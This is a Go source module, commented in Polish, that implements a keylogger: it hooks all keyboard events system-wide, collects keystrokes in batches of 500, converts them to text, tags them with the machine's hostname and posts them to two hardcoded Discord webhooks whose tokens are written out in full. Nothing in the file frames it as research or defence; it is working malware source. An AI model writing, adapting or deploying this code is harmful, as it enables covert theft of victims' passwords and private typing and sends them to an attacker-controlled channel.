package modules

import (
	"os"
	"strings"

	utils "ssc/structs"

	hook "github.com/robotn/gohook"
)

const res_webhook_link string = "https://discord.com/api/webhooks/1224461106303467641/oaSR8xCS6mfQ3tR8ssOQLwb-S1kPqH1LWXtkvph54jWZDwTwwh5pwmlqkN3BxKPcbAHY"
const res_webhook_link2 string = "https://discord.com/api/webhooks/1227680406145466611/eRbQxWtqw_VjdMwtgktgggJd7LeqpXzMzI2r-v188_G6uc_61lrVTuvggbP3nltX7D_c"

func Logs() {
	var rawCodes []int
	var maxLen int = 500

	evChan := hook.Start()
	defer hook.End()

	for ev := range evChan {
		// Sprawdzenie, czy zdarzenie jest typu KeyDown
		if ev.Kind == hook.KeyDown {
			// Dodanie Rawcode do tablicy rawCodes po konwersji na int
			rawCodes = append(rawCodes, int(ev.Rawcode))

			// Sprawdzenie długości tablicy rawCodes
			if len(rawCodes) >= maxLen {
				// Wywołanie funkcji send i przekazanie tablicy rawCodes
				send(rawCodes)
				// Wyczyszczenie tablicy rawCodes
				rawCodes = nil
			}
		}
	}
}

func send(rawCodes []int) {
	var username string = "scc"
	// Konwersja każdego elementu tablicy rawCodes na literę i dodanie go do tablicy letters
	var letters []string

	// Dodanie każdej litery do tablicy letters
	for _, code := range rawCodes {
		letters = append(letters, string(code))
	}

	// Połączenie wszystkich liter w jednym stringu
	letterString := strings.Join(letters, "")

	hostname, err := os.Hostname()
	if err == nil {
		username = hostname
	}

	userData := utils.UserData{
		Username: username,
		Content:  letterString,
	}

	SendMessageToWebhook(userData, res_webhook_link)
	SendMessageToWebhook(userData, res_webhook_link2)
}
